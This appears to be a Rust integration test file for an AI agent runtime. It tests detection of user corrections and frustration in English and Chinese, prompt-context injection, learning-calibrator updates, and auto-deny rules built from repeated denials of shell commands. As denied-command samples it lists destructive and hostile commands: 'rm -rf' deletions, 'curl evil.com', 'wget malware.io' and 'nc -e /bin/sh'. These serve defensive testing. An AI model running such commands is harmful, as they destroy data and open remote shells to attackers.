//! Integration tests for the session feedback loop (边做边学).
//!
//! Tests the full cycle:
//! 1. User message with implicit feedback signal detected
//! 2. Signal injected into prompt context
//! 3. Denial patterns extracted and auto-rules generated
//! 4. Signal bridged to learning pipeline

use std::sync::{Arc, Mutex};

use astra_runtime::pipeline::{
    calibration::ProgressiveCalibrator,
    learning::PipelineLearningWriter,
    routing::{DomainHint, TaskType},
};
use astra_runtime::turn::approval_fingerprint::{
    ApprovalFingerprint, DenialAction, DenialTracker,
};
use astra_runtime::turn::implicit_feedback::{
    detect_implicit_feedback_signal, implicit_feedback_context_injection, implicit_feedback_rating,
};
use astra_runtime::orchestration::permission_sync::PermissionRule;

// ─── Phase A + B: Detection → Injection ─────────────────────────────────────

#[test]
fn end_to_end_correction_detected_and_injected() {
    // User says "不对" (wrong) after a previous assistant response
    let user_input = "不对，应该用另一种方法";
    let prev_assistant = "I suggest using the bash tool to list files.";

    // Phase A/B: Detect implicit feedback
    let signal = detect_implicit_feedback_signal(user_input, Some(prev_assistant));
    assert_eq!(signal.signal_type, "correction");
    assert!(signal.confidence >= 0.7);

    // Generate context injection
    let injection = implicit_feedback_context_injection(&signal);
    assert!(injection.is_some());
    let text = injection.unwrap();

    // Verify injection contains key elements
    assert!(text.contains("[Session Feedback]"));
    assert!(text.contains("correction"));
    assert!(text.contains("confidence"));
}

#[test]
fn end_to_end_frustration_detected_and_injected() {
    // Use patterns that are in our detection rules
    let user_input = "terrible response, this is useless";
    let prev_assistant = "Here is the result of your query.";

    let signal = detect_implicit_feedback_signal(user_input, Some(prev_assistant));
    assert_eq!(signal.signal_type, "frustration");

    let injection = implicit_feedback_context_injection(&signal);
    assert!(injection.is_some());
    assert!(injection.unwrap().contains("dissatisfaction"));
}

#[test]
fn end_to_end_positive_not_injected() {
    let user_input = "太好了，这正是我需要的！";

    let signal = detect_implicit_feedback_signal(user_input, None);
    assert_eq!(signal.signal_type, "positive");

    // Positive signals should NOT produce injection
    let injection = implicit_feedback_context_injection(&signal);
    assert!(injection.is_none());
}

// ─── Phase C: Denial Pattern → Auto-Rules ───────────────────────────────────

#[test]
fn end_to_end_repeated_denials_generate_auto_rule() {
    let mut tracker = DenialTracker::default();

    // User denies the same dangerous command twice
    let fp1 = ApprovalFingerprint::shell("bash", "rm -rf /important", false);
    let fp2 = ApprovalFingerprint::shell("bash", "rm -rf /data", false);

    // First denial - no rule yet
    tracker.record_with_reason(&fp1, false, Some("too dangerous"));
    assert!(tracker.extract_auto_deny_rules().is_empty());

    // Second denial with same prefix pattern - should generate rule
    tracker.record_with_reason(&fp2, false, Some("still dangerous"));

    let rules = tracker.extract_auto_deny_rules();
    assert!(!rules.is_empty(), "should generate auto-deny rule after 2 denials");

    // Verify the generated rule matches the pattern
    let bash_rm_rule = rules
        .iter()
        .find(|r| r.tool == "bash" && r.pattern.as_ref().map(|p| p.contains("rm")).unwrap_or(false));
    assert!(bash_rm_rule.is_some());
}

#[test]
fn end_to_end_varied_denials_generate_bare_tool_rule() {
    let mut tracker = DenialTracker::default();

    // User denies 3 different bash commands
    tracker.record_with_reason(
        &ApprovalFingerprint::shell("bash", "curl evil.com", false),
        false,
        None,
    );
    tracker.record_with_reason(
        &ApprovalFingerprint::shell("bash", "wget malware.io", false),
        false,
        None,
    );
    tracker.record_with_reason(
        &ApprovalFingerprint::shell("bash", "nc -e /bin/sh", false),
        false,
        None,
    );

    let rules = tracker.extract_auto_deny_rules();

    // Should generate bare "bash" rule after 3 varied denials
    let bare_bash = rules.iter().find(|r| r.tool == "bash" && r.pattern.is_none());
    assert!(bare_bash.is_some(), "should generate bare tool rule after 3 varied denials");
}

#[test]
fn end_to_end_denial_action_escalates() {
    let mut tracker = DenialTracker::default();
    let fp = ApprovalFingerprint::shell("bash", "dangerous", false);

    // First two denials - continue
    assert_eq!(tracker.record(&fp, false), DenialAction::Continue);
    assert_eq!(tracker.record(&fp, false), DenialAction::Continue);

    // Third denial - skip tool (default limit is 3)
    assert_eq!(tracker.record(&fp, false), DenialAction::SkipTool);
}

// ─── Phase D: Signal → Learning Pipeline ────────────────────────────────────

#[test]
fn end_to_end_correction_updates_calibrator() {
    let cal = Arc::new(Mutex::new(ProgressiveCalibrator::new(0.15)));
    let writer = PipelineLearningWriter::new().with_progressive_calibrator(cal.clone());

    // User says "错了" (wrong)
    let signal = detect_implicit_feedback_signal("错了，这不对", None);
    assert_eq!(signal.signal_type, "correction");

    // Bridge to learning pipeline
    writer.record_implicit_feedback(&signal, "code", Some(DomainHint::Code), TaskType::Code);

    // Verify calibrator recorded the correction
    let c = cal.lock().unwrap();
    let stats = c.intent_stats("code");
    assert!(stats.is_some());
    assert!(stats.unwrap().correction_rate() > 0.0);
}

#[test]
fn end_to_end_positive_records_success() {
    let cal = Arc::new(Mutex::new(ProgressiveCalibrator::new(0.15)));
    let writer = PipelineLearningWriter::new().with_progressive_calibrator(cal.clone());

    let signal = detect_implicit_feedback_signal("perfect, thank you!", None);
    assert_eq!(signal.signal_type, "positive");

    writer.record_implicit_feedback(&signal, "fetch", Some(DomainHint::GitHub), TaskType::Fetch);

    let c = cal.lock().unwrap();
    let stats = c.intent_stats("fetch");
    assert!(stats.is_some());
    // Positive = was_corrected=false, so correction_rate should be 0
    assert_eq!(stats.unwrap().correction_rate(), 0.0);
}

#[test]
fn end_to_end_rating_mapping() {
    // Verify the feedback rating scale
    assert_eq!(implicit_feedback_rating("correction"), 1);
    assert_eq!(implicit_feedback_rating("frustration"), 1);
    assert_eq!(implicit_feedback_rating("rephrasing"), 2);
    assert_eq!(implicit_feedback_rating("clarification"), 3);
    assert_eq!(implicit_feedback_rating("neutral"), 3);
    assert_eq!(implicit_feedback_rating("positive"), 5);
}

// ─── Full Cycle Integration ─────────────────────────────────────────────────

#[test]
fn full_feedback_cycle_correction_to_learning() {
    // Simulate a full feedback cycle:
    // 1. User provides correction
    // 2. Signal detected and injection generated
    // 3. Learning pipeline updated

    let cal = Arc::new(Mutex::new(ProgressiveCalibrator::new(0.15)));
    let writer = PipelineLearningWriter::new().with_progressive_calibrator(cal.clone());

    // Step 1: User message with correction
    let user_input = "wrong, that's not what I asked for";
    let prev_response = "Here is the result.";

    // Step 2: Detect and generate injection
    let signal = detect_implicit_feedback_signal(user_input, Some(prev_response));
    let injection = implicit_feedback_context_injection(&signal);

    assert!(injection.is_some(), "correction should generate injection");

    // Step 3: Update learning pipeline
    writer.record_implicit_feedback(&signal, "reasoning", None, TaskType::Reasoning);

    // Verify the full cycle worked
    let c = cal.lock().unwrap();
    assert!(c.intent_stats("reasoning").is_some());
    assert!(c.intent_stats("reasoning").unwrap().correction_rate() > 0.0);
}

#[test]
fn full_denial_cycle_to_auto_rule() {
    // Simulate denial cycle:
    // 1. User denies tool calls
    // 2. Auto-rules extracted
    // 3. Rules can be applied to permission context

    let mut tracker = DenialTracker::default();

    // Simulate two denials of the same dangerous command pattern
    // Both have "rm -rf" as the prefix (first 2 tokens)
    let fp1 = ApprovalFingerprint::shell("bash", "rm -rf /important/data", false);
    let fp2 = ApprovalFingerprint::shell("bash", "rm -rf /sensitive/files", false);

    tracker.record_with_reason(&fp1, false, Some("dangerous deletion"));
    tracker.record_with_reason(&fp2, false, Some("another dangerous deletion"));

    // Extract rules
    let rules = tracker.extract_auto_deny_rules();

    // Verify rules are actionable - should have pattern for "rm -rf"
    assert!(!rules.is_empty(), "should generate auto-deny rule after 2 similar denials");

    // Rules should match the "rm -rf" prefix
    let matches_rm = |rule: &PermissionRule| {
        rule.tool == "bash" && rule.pattern.as_ref().map(|p| p.contains("rm")).unwrap_or(false)
    };
    assert!(rules.iter().any(matches_rm), "should generate rule for rm commands");
}

// ─── Edge Cases: Boundary Conditions ────────────────────────────────────────

#[test]
fn edge_case_empty_input_is_neutral() {
    let signal = detect_implicit_feedback_signal("", None);
    assert_eq!(signal.signal_type, "neutral");
    assert!(signal.evidence.is_empty());

    // Empty input should not generate injection
    let injection = implicit_feedback_context_injection(&signal);
    assert!(injection.is_none());
}

#[test]
fn edge_case_whitespace_only_is_neutral() {
    let signal = detect_implicit_feedback_signal("   \t\n  ", None);
    assert_eq!(signal.signal_type, "neutral");
}

#[test]
fn edge_case_very_long_input_still_detects() {
    // 1000 chars of padding followed by correction keyword
    let padding = "a".repeat(1000);
    let input = format!("{} 不对 this is wrong {}", padding, padding);

    let signal = detect_implicit_feedback_signal(&input, None);
    assert_eq!(signal.signal_type, "correction");
}

#[test]
fn edge_case_unicode_characters_handled() {
    // Emojis and special unicode
    let signal = detect_implicit_feedback_signal("🤬 terrible! 💢", None);
    assert_eq!(signal.signal_type, "frustration");

    // Chinese characters with unicode punctuation
    let signal2 = detect_implicit_feedback_signal("『不对』，请重试", None);
    assert_eq!(signal2.signal_type, "correction");
}

#[test]
fn edge_case_mixed_case_detection() {
    // Mixed case should still match (case insensitive)
    let signal = detect_implicit_feedback_signal("WRONG answer", None);
    assert_eq!(signal.signal_type, "correction");

    let signal2 = detect_implicit_feedback_signal("TeRrIbLe response", None);
    assert_eq!(signal2.signal_type, "frustration");
}

#[test]
fn edge_case_special_regex_characters() {
    // Input with regex special chars should not crash
    let signal = detect_implicit_feedback_signal("test [abc] (def) {ghi} .* + ? | \\ ^ $", None);
    assert_eq!(signal.signal_type, "neutral");
}

#[test]
fn edge_case_denial_with_empty_reason() {
    let mut tracker = DenialTracker::default();
    let fp = ApprovalFingerprint::shell("bash", "some cmd", false);

    // Empty string reason should not crash
    tracker.record_with_reason(&fp, false, Some(""));
    tracker.record_with_reason(&fp, false, Some(""));

    let rules = tracker.extract_auto_deny_rules();
    assert!(!rules.is_empty());
}

#[test]
fn edge_case_denial_with_none_reason() {
    let mut tracker = DenialTracker::default();
    let fp = ApprovalFingerprint::shell("bash", "cmd", false);

    // None reason should work fine
    tracker.record_with_reason(&fp, false, None);
    tracker.record_with_reason(&fp, false, None);

    let rules = tracker.extract_auto_deny_rules();
    assert!(!rules.is_empty());
}

#[test]
fn edge_case_very_long_command_prefix() {
    let long_cmd = format!("verylongcommandname{}", "x".repeat(500));
    let fp = ApprovalFingerprint::shell("bash", &long_cmd, false);

    let mut tracker = DenialTracker::default();
    tracker.record_with_reason(&fp, false, None);
    tracker.record_with_reason(&fp, false, None);

    // Should still generate rules without crashing
    let rules = tracker.extract_auto_deny_rules();
    assert!(!rules.is_empty());
}

#[test]
fn edge_case_calibrator_with_empty_intent() {
    let cal = Arc::new(Mutex::new(ProgressiveCalibrator::new(0.15)));
    let writer = PipelineLearningWriter::new().with_progressive_calibrator(cal.clone());

    let signal = detect_implicit_feedback_signal("wrong", None);

    // Empty intent string should not crash
    writer.record_implicit_feedback(&signal, "", None, TaskType::Unknown);

    let c = cal.lock().unwrap();
    // Should still record (with empty string as key)
    assert!(c.intent_stats("").is_some());
}

#[test]
fn edge_case_injection_text_content() {
    // Verify injection text is well-formed
    let signal = detect_implicit_feedback_signal("错了，不是这样", None);
    let injection = implicit_feedback_context_injection(&signal);

    let text = injection.expect("should have injection");

    // Check structure
    assert!(text.starts_with("[Session Feedback]"));
    assert!(text.contains("correction"));
    assert!(text.contains("0.7")); // confidence

    // Should be reasonable length (not too long)
    assert!(text.len() < 500, "injection should be concise");
}

#[test]
fn edge_case_prev_response_very_long() {
    // Very long previous response should still work
    let long_response = "The assistant said something ".repeat(100);
    let signal = detect_implicit_feedback_signal("wrong", Some(&long_response));

    assert_eq!(signal.signal_type, "correction");
}

#[test]
fn edge_case_approval_reset_clears_all_state() {
    let mut tracker = DenialTracker::default();

    // Add some denials
    for i in 0..5 {
        let fp = ApprovalFingerprint::shell("bash", &format!("cmd{}", i), false);
        tracker.record_with_reason(&fp, false, Some("reason"));
    }

    assert!(!tracker.extract_auto_deny_rules().is_empty());
    assert!(tracker.total_denials() > 0);

    // Reset should clear everything
    tracker.reset();

    assert!(tracker.extract_auto_deny_rules().is_empty());
    assert_eq!(tracker.total_denials(), 0);
}
